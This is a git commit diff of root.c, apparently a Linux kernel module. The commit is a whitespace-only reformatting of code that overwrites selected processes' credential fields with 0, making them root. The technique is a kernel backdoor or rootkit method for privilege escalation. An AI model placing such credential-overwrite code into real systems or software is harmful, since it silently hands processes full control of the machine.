bf12cbb84da8d23b7fc79f13ed90341729d5fd89
Matthew Tejo <matthew.tejo@gmail.com>
2016-05-19 18:18:32 -0700

    tabs... spaces...

--- root.c
+++ root.c
@@ -26,15 +26,15 @@ int init_module()
 		{
 			cred = (struct cred *)__task_cred(task);
 			printk(KERN_INFO "changing %d - %s ; uid %d\n",task->pid,task->comm,task->real_cred->uid.val);
-			cred -> uid.val = 0;
-			cred -> gid.val =0;
+			cred->uid.val = 0;
+			cred->gid.val =0;
 			cred->suid.val = 0;
 			cred->sgid.val = 0;
-            cred->euid.val = 0;
-            cred->egid.val = 0;
-            cred->fsuid.val = 0;
-            cred->fsgid.val = 0;
-            
+			cred->euid.val = 0;
+			cred->egid.val = 0;
+			cred->fsuid.val = 0;
+			cred->fsgid.val = 0;
+			
 			printk(KERN_INFO "uids %d -- %d \n",task->real_cred->uid.val,cred->uid.val);
 			printk(KERN_WARNING "pid %d , %s is now root\n",task->pid,task->comm);
 		}
